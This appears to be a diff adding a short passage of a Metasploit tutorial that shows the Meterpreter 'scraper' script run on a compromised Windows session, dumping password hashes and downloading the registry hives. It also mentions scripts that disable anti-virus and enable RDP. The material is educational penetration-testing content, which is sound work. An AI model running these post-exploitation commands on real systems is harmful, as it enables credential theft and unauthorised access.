@@ -1,0 +1,15 @@
+The scraper script can grab even more system information, including the entire registry.
+
+meterpreter > run scraper
+
+[*] New session on 10.211.55.128:4444...
+[*] Gathering basic system information...
+[*] Dumping password hashes...
+[*] Obtaining the entire registry...
+[*] Exporting HKCU
+[*] Downloading HKCU (C:\WINDOWS\TEMP\LQTEhIqo.reg)
+[*] Cleaning HKCU
+[*] Exporting HKLM
+[*] Downloading HKLM (C:\WINDOWS\TEMP\GHMUdVWt.reg)
+
+From our examples above we can see that there are plenty of Meterpreter scripts for us to enumerate a ton of information, disable anti-virus for us, enable RDP, and much much more.
